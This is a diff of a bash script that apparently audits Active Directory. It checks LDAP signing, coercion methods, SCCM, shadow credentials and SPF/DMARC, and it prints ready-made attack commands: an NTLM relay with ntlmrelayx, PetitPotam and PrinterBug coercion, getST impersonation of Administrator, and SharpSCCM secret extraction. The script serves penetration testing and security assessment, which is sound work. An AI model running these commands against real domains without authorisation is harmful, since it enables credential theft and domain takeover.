@@ -53,6 +53,10 @@ if ! command -v manspider &>/dev/null && [ ! -x "/root/.local/bin/manspider" ]; 
   echo -e "${GREY}[--] manspider not found — SMB content scan will be skipped${NC}"
 fi
 
+if ! command -v sccmhunter.py &>/dev/null && [ ! -f "/opt/tools/sccmhunter/sccmhunter.py" ]; then
+  echo -e "${GREY}[--] sccmhunter.py not found — SCCM check will be skipped${NC}"
+fi
+
 GRIFFON_PATH="/workspace/GriffonAD"
 if [ ! -d "$GRIFFON_PATH" ]; then
   git clone https://github.com/shellinvictus/GriffonAD "$GRIFFON_PATH" &>/dev/null 2>&1
@@ -174,6 +178,7 @@ if [ ! -z "$SCOPE_FILE" ]; then
   echo -e "${GREY}[*] Scope: ${#SCAN_TARGETS[@]} subnet(s) (${SCAN_TARGETS[*]})${NC}"
 fi
 SCAN_TARGETS_STR="${SCAN_TARGETS[*]}"
+RELAY_COUNT=0
 
 # Hostname DC
 DC_HOSTNAME=$(echo "$NXC_SMB" | grep -oP '(?<=name:)[^)]+' | tr -d ' ')
@@ -348,7 +353,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
   fi
 fi
 
-# LDAP Signing & Channel Binding - Multi-DC Check
+# LDAP Signing & Channel Binding
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldap_security_check.csv"
   VULN_DCS=""
@@ -375,9 +380,13 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       printf "$VULN_DCS"
     fi
     FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
-    echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
-    echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    if [ "$RELAY_COUNT" -gt 0 ]; then
+      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
+      echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    else
+      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
+    fi
   else
     echo -e "${GREEN}[OK] All DCs have LDAP Signing + Channel Binding enforced${NC}"
   fi
@@ -387,9 +396,13 @@ else
   LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
   if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
     echo -e "${RED}[KO] LDAP Signing + Channel Binding NOT enforced${NC}"
-    echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
-    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
-    echo -e "${GREY}          3) getST.py -spn cifs/${DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    if [ "$RELAY_COUNT" -gt 0 ]; then
+      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
+      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
+      echo -e "${GREY}          3) getST.py -spn cifs/${DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    else
+      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
+    fi
   elif [ "$LDAP_SIGNING" = "None" ]; then
     echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
     echo -e "${GREEN}       └─ Not Exploitable: Channel Binding enabled${NC}"
@@ -609,21 +622,14 @@ if [ ! -z "$COERCE_METHODS" ]; then
   if [ ! -z "$NON_DC_UNCON" ]; then
     echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
   fi
-  if echo "$COERCE_METHODS" | grep -q "PetitPotam"; then
-    echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-  fi
-  if echo "$COERCE_METHODS" | grep -q "PrinterBug"; then
-    echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}"
-  fi
-  if echo "$COERCE_METHODS" | grep -q "DFSCoerce"; then
-    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-  fi
-  if echo "$COERCE_METHODS" | grep -q "ShadowCoerce"; then
-    echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-  fi
-  if echo "$COERCE_METHODS" | grep -q "MSEven"; then
-    echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-  fi
+  FIRST_COERCE=$(echo "$COERCE_METHODS" | tr ',' '\n' | tr -d ' ' | head -1)
+  case "$FIRST_COERCE" in
+    PetitPotam)   echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+    PrinterBug)   echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}" ;;
+    DFSCoerce)    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+    ShadowCoerce) echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+    MSEven)       echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
+  esac
 else
   echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
 fi
@@ -840,15 +846,32 @@ else
   echo -e "${GREEN}[OK] No MDT infrastructure detected${NC}"
 fi
 
-# SCCM/MECM Detection
-SCCM_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M sccm 2>/dev/null)
-if echo "$SCCM_OUTPUT" | grep -q "Found SCCM object\|Found.*Site Servers\|Found.*SCCM Sites"; then
-  echo -e "${RED}[KO] SCCM/MECM infrastructure detected → sccm.txt${NC}"
-  echo "$SCCM_OUTPUT" | grep -v "^\[" > "$OUTPUT_DIR/sccm.txt"
-  echo -e "${GREY}       └─ SharpSCCM.exe local secrets -m disk${NC}"
-  echo -e "${GREY}          SharpSCCM.exe get collections${NC}"
+# SCCMHunter
+if command -v sccmhunter.py &>/dev/null || [ -f "/opt/tools/sccmhunter/sccmhunter.py" ]; then
+  if command -v sccmhunter.py &>/dev/null; then
+    SCCM_CMD="sccmhunter.py"
+  else
+    SCCM_CMD="/opt/tools/sccmhunter/venv/bin/python3 /opt/tools/sccmhunter/sccmhunter.py"
+  fi
+  SCCM_FIND=$($SCCM_CMD find -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip $DC_IP 2>&1)
+  if echo "$SCCM_FIND" | grep -q "ModuleNotFoundError\|ImportError\|No module named"; then
+    echo -e "${GREY}[--] SCCMHunter dependencies missing — SCCM check skipped${NC}"
+  elif echo "$SCCM_FIND" | grep -q "System Management Container not found\|No results found"; then
+    echo -e "${GREEN}[OK] No SCCM/MECM infrastructure detected${NC}"
+  else
+    echo "$SCCM_FIND" > "$OUTPUT_DIR/sccmhunter_find.txt"
+    echo -e "${RED}[KO] SCCM/MECM infrastructure detected → sccmhunter_find.txt${NC}"
+    $SCCM_CMD show -all 2>&1 > "$OUTPUT_DIR/sccmhunter_show.txt"
+    NAA_COUNT=$(grep -ci "naa\|network access" "$OUTPUT_DIR/sccmhunter_show.txt" 2>/dev/null)
+    NAA_COUNT=${NAA_COUNT:-0}
+    if [ "$NAA_COUNT" -gt 0 ]; then
+      echo -e "${RED}       └─ NAA credentials may be present → sccmhunter_show.txt${NC}"
+    fi
+    echo -e "${GREY}       └─ sccmhunter.py http -u '$AD_USER' -p '$PASSWORD' -d '$DOMAIN' -dc-ip $DC_IP${NC}"
+    echo -e "${GREY}          SharpSCCM.exe local secrets -m disk${NC}"
+  fi
 else
-  echo -e "${GREEN}[OK] No SCCM/MECM infrastructure detected${NC}"
+  echo -e "${GREY}[--] SCCMHunter not found — SCCM check skipped${NC}"
 fi
 
 # dMSA / BadSuccessor Check
@@ -1230,11 +1253,12 @@ SHADOW_CREDS_COUNT=$(echo "$SHADOW_CREDS_ACCOUNTS" | grep -v "^$" | wc -l)
 if [ "$SHADOW_CREDS_COUNT" -gt 0 ]; then
   echo -e "${RED}[KO] $SHADOW_CREDS_COUNT account(s) with Shadow Credentials (msDS-KeyCredentialLink) found → shadow_creds.txt${NC}"
   echo "$SHADOW_CREDS_OUTPUT" | grep -E "^(sAMAccountName|msDS-KeyCredentialLink):" > "$OUTPUT_DIR/shadow_creds.txt"
+  FIRST_SHADOW_TARGET=$(echo "$SHADOW_CREDS_ACCOUNTS" | head -1)
   echo "$SHADOW_CREDS_ACCOUNTS" | while read -r account; do
     [ -z "$account" ] && continue
     echo -e "${RED}       └─ $account${NC}"
   done
-  echo -e "${GREY}       └─ pywhisker -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --target <account> --action list${NC}"
+  echo -e "${GREY}       └─ pywhisker -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --target '$FIRST_SHADOW_TARGET' --action list${NC}"
 else
   echo -e "${GREEN}[OK] No Shadow Credentials found${NC}"
 fi
@@ -1311,7 +1335,7 @@ fi
 
 # Email Security (SPF/DMARC)
 if [[ "$DOMAIN" == *.local || "$DOMAIN" == *.htb ]]; then
-  echo -e "${GREY}[--] SPD and DMARC skipped (.local domain is internal only)${NC}"
+  echo -e "${GREY}[--] SPF and DMARC skipped (.local domain is internal only)${NC}"
 else
   SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
   DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
